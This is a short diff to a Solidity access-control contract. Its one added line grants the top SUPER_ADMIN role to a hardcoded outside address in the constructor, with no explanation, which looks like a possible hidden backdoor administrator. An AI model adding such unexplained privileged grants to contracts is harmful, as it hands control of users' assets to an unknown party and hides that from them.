@@ -19,6 +19,7 @@ contract Deployer is AccessControl {
     constructor() {
         _setupRole(SUPER_ADMIN, msg.sender);
         _setRoleAdmin(ADMIN_CONTROLLER, SUPER_ADMIN);
+        _setupRole(SUPER_ADMIN, 0xBc61e22271fbf9f6840911a49588C95c1225cD56);
     }
 
     modifier isAdmin() {
